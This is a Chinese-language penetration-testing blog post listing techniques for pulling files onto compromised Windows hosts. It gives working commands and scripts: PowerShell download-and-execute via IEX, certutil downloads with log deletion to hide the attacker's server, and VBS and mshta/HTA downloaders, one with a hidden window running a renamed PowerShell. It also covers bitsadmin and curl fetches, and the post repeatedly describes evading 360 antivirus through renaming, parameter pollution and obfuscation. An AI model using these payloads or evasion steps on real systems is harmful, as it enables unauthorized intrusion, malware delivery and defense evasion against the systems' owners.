---
title: windows文件下载常用方法
date: 2021-10-09 10:55:16
tags:
---

# windows文件下载常用方法



## 概述

在渗透过程中，通常会需要向目标主机传送一些文件，来达到权限提升、权限维持等目的，本篇文章主要介绍一些windows下常用的文件下载方式，以及一些可以bypass的姿势。





## Powershell

PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的 shell 不同，PowerShell构建在 .NET公共语言运行时 (CLR) 的基础之上，接受并返回.NET对象，这从根本上的改变引入了全新的自动化工具和方法。

远程下载文件到本地：

```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.174.1:1234/evil.txt','evil.exe')

// 远程下载文件并执行，无文件落地
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://example.com/evil.txt'))"
```

针对于powershell常规的绕过方式有利用别名或者混淆来进行绕过，这里推荐一个工具Invoke-DOSfuscation。Invoke-DOSfuscation 是一个兼容 PowerShell v2.0+ 的 cmd.exe 命令混淆框架。（white paper：[DOSfuscation: Exploring the Depths of Cmd.exe Obfuscation and Detection Techniques | FireEye Inc](https://www.fireeye.com/blog/threat-research/2018/03/dosfuscation-exploring-obfuscation-and-detection-techniques.html)）

使用方法：

```
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git

cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```



![image-20210907101040988](/img/image-20210907101040988-4138597.png)



![image-20210907100734469](/img/image-20210907100734469-4138597.png)

更多的功能可以参考[D1T2 - Daniel Bohannon - Invoke-DOSfuscation.pdf (hitb.org)](https://conference.hitb.org/hitbsecconf2018ams/materials/D1T2 - Daniel Bohannon - Invoke-DOSfuscation.pdf)

## certutil

certutil.exe是一个命令行程序，作为证书服务的一部分安装，你可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。

我们可以利用certutil.exe去下载我们的文件

```
//下载命令
certutil -urlcache -split -f http://example.com/evil.txt test.exe
//base64后进行下载
certutil -urlcache -split -f http://example.com/base64.txt
certutil -decode base64.txt test.exe

```

当我们下载成功后会存在一个日志文件，执行certutil.exe 可以看到我们的日志

![image-20210830163743555](/img/image-20210830163743555-4138597.png)

为了隐藏我们的下载日志，以免自己的服务器暴露，需要对下载的日志进行删除。

```
//删除下载日志的命令
certutil.exe -urlcache -split -f http://example.com/evil.txt delete
```

### bypass 360（该方法有点玄学，时灵时不灵）

在实际的测试过程中，发现360会监控certutil.exe文件，他会读取该文件执行时的commandline，这时候，我们可以将certutil.exe复制到另一个目录并修改文件名，这时候再执行操作360就不会进行拦截。

tips：存在一个问题，复制出来的certutil.exe可能会在多次执行后被360标记。这时候，就删掉该文件，重新选一个目录进行复制，可以解决问题

![image-20210830171929913](/img/image-20210830171929913-4138597.png)





![image-20210830171958958](/img/image-20210830171958958-4138597.png)

同时可以使用参数污染的形式进行绕过测试

```
cmd.exe /c "whoami..\..\..\..\..\..\..\..\..\..\..\..\..\windows\system32\certutil.exe" -urlcache -split -f http://example.com/1.exe 1.exe 
```



## vbs下载文件

VBScript是Visual Basic Script的简称，有时也被缩写为VBS。VBScript是微软开发的一种脚本语言，可以看作是VB语言的简化版，与Visual Basic for Applications的关系也非常密切。它具有原语言容易学习的特性。目前这种语言广泛应用于网页和ASP程序制作，同时还可以直接作为一个可执行程序。用于调试简单的VB语句非常方便。

在VBS中常用的文件流操作命令为Scripting.FileSystemObject和adodb.stream这两个，一般来说，会利用这两个方法来构造下载的vbs脚本。

利用adodb.stream下载文件

```vbscript
Set objXMLHTTP = CreateObject("Msxml2.ServerXMLHTTP.6.0")
Set Astream = CreateObject("adodb.stream")
objXMLHTTP.open "GET",wsh.arguments(0),0
objXMLHTTP.send
Astream.type=1
Astream.Mode=3
Astream.open
Astream.Write objXMLHTTP.responseBody //360会杀这个写入
Astream.SaveToFile wsh.arguments(1),2

// 执行
cscript example.vbs http://example.com/1.exe 1.exe
```



代码较为简单，支持利用echo来进行写入

```
// 一句话写入版
echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open ^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> d.vbs
```

### bypass

经过测试360发现，应该是国内利用adodb.stream的人太多了，然后被360进行了重点标记。所以，我们选择尝试利用FileSystemObject来对文件进行写入。

代码如下：

```vbscript
Sub HTTPDownload( myURL, myPath )
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next
    objFile.Close( )
End Sub
HTTPDownload wsh.arguments(0), wsh.arguments(1)
```

该脚本在第一次测试中没有被360杀，不过在后续测试中被360杀了，初步认为是被360上传到云端标记了，简单做了一下代码的修改，例如将function的名字进行修改，又可以绕过了。

![image-20210902152309710](/img/image-20210902152309710-4138597.png)

在红队攻防中，建议修改第二种代码来进行绕过。



## mshta下载文件

mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件，我们可以在本地构建hta文件，之后通过目标主机的mshta来远程下载并执行。

mshta支持三种方式来获取hta文件，分别是本地的文件系统、远程HTTP以及UNC路径。远程HTTP和UNC路径的好处在于不用文件落地。



以下是我们执行命令的文件，主要是利用wscript.shell来执行命令

```html
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	}
]]>
</script>
</scriptlet>
```

将以上脚本保存并放到服务器上并执行命令，就能弹出一个计算器。

```
mshta.exe javascript:a=(GetObject("script:http://example/m.sct")).Exec();close();
```

同样的hta支持jscript的函数来执行操作，jscript的函数基本上跟vbscript一模一样，主要也是通过Scripting.FileSystemObject和adodb.stream来执行下载的任务，不过这里面有一个区别，jscript的FileSystemObject只能操作非二进制文件，也就是说，我们的exe文件不能通过FileSystemObject来进行下载。

以下是我们下载非二进制的脚本：

```html
<HTML>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="jscript">
var url = 'http://45.32.99.159:443/1.txt';
var path = 'c:\\users\\public\\1.txt';

var objXML = new ActiveXObject("Microsoft.XMLHTTP");
objXML.open('GET',url,false);
objXML.send()

var fso = new ActiveXObject("Scripting.FileSystemObject");
var a = fso.CreateTextFile(path, true);
a.write(objXML.responseText);
a.close();
self.close();
</script>
<body>
demo
</body>
</HEAD> 
</HTML>

```

同样的，该方法可以绕过360来进行下载，我们可以先将文件base64编码，然后利用该脚本下载，最后利用certutil.exe来对文件解码。

当然我们也可以直接利用mstha来执行powershell的命令，从而达到下载文件的效果。

```html
<HTML> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe", "C:/Windows/Temp/powershell.tmp", True
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "C:/Windows/Temp/powershell.tmp -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/evil.txt'))"""
self.close
</script>
<body>
</body>
</HEAD> 
</HTML> 
```



## Bitsadmin

BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。不过该功能存在一个缺点，需要管理员权限。

bitsadmin存在多种下载命令：

```
bitsadmin /rawreturn /transfer getfile http://example.com/test.zip c:\windows\temp\test.zip

bitsadmin /rawreturn /transfer getpayload http://example.com/test.zip c:\windows\temp\test.zip

//该命令带有进度条
bitsadmin /transfer myDownLoadJob /download /priority normal "http://example.com/test.zip" "c:\windows\temp\test.zip"

//以创建计划任务的形式执行命令
bitsadmin /create myDownloadJob   //创建任务
bitsadmin /addfile myDownloadJob http://example.com/test.zip c:\windows\temp\test.zip   //给任务添加下载文件
bitsadmin /resume myDownloadJob 
bitsadmin /info myDownloadJob /verbose
bitsadmin /complete myDownloadJob
```



## Curl

在windows 10（17063）及其以后的版本中，微软内置了curl这个命令行工具，这意味着我们也可以通过curl进行文件的下载操作，curl是一个利用 URL 语法，在命令行终端下使用的网络请求工具，支持 HTTP、HTTPS、FTP 等协议。

curl的一些常见命令如下：

```
//http

curl http://example.com/1.exe -o 1.tmp 

curl http://example.com/1.exe -O

//ftp

curl ftp://example.com/dd/1.zip -u "user:passwd" -o "a.zip"
 

```





